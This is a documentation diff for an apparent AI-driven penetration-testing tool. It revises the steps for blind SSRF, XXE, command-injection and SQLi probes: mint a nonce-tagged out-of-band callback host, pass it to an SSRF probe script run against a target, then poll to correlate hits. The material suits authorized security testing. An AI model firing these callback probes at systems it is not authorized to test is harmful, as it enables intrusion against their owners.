@@ -132,14 +132,20 @@ file under `scans/` and read that.
 
 For blind probes (SSRF, XXE, command injection, blind SQLi) the signal is an
 out-of-band hit, not the HTTP response. Mint a nonce-tagged callback host on the
-host **before** the probe runs and pass it in as an argument — the nonce is the
-correlation token (full protocol in `agent/references/offensive-tactics/frp-tunneling.md`):
+host **before** the probe runs and pass it in as an argument. `mint` binds the
+nonce under a running OOB client's interactsh id and prints the full host as
+`$OOB_HOST` (`<nonce>.<client-id>.oob...`) — that binding is what lets `poll`
+correlate the hit, so substitute mint's output verbatim and never hand-build a
+bare `<nonce>.oob...` host (full protocol in
+`agent/references/offensive-tactics/frp-tunneling.md`):
 
 ```bash
-# 1. Confirm OOB is up, then mint a per-payload nonce host.
-vigil oob status --json
-vigil oob mint --technique ssrf --target-url https://target.example/fetch --param url
-# → http  http://<nonce>.oob.example.com/
+# 1. Confirm OOB is healthy (a running, registered client must exist), then mint.
+vigil oob status --json          # expect health=ok; degraded exits non-zero
+vigil oob mint --client <your-client-name> \
+  --technique ssrf --target-url https://target.example/fetch --param url
+# → host  <nonce>.<client-id>.oob.example.com      ← this is $OOB_HOST
+# → http  http://<nonce>.<client-id>.oob.example.com/
 
 # 2. Pass the minted host into the probe as a parameter (do NOT hard-code it).
 vigil assess kali exec \
@@ -147,15 +153,15 @@ vigil assess kali exec \
   --probe-kind payload --phase consume-test --timeout 120 -- \
   python3 /engagements/$ENGAGEMENT_KEY/scripts/ssrf_callback.py \
     --target https://target.example/fetch --param url \
-    --callback http://<nonce>.oob.example.com/ssrf-probe
+    --callback http://$OOB_HOST/ssrf-probe
 
 # 3. After firing, correlate the hit (nonce <-> probe) — NOT the raw client log.
-vigil oob poll --client <your-client-name>
+vigil oob poll --client <your-client-name>   # same client you minted under
 ```
 
-`vigil oob mint` flags that matter for a probe: `--technique`, `--target-url`,
-`--param`, `--probe-kind`, `--request-hash`, `--notes`, `--json`. Mint one nonce
-per payload so each callback is unambiguously attributable.
+`vigil oob mint` flags that matter for a probe: `--client`, `--technique`,
+`--target-url`, `--param`, `--probe-kind`, `--request-hash`, `--notes`, `--json`.
+Mint one nonce per payload so each callback is unambiguously attributable.
 
 ### The finding-return convention
 
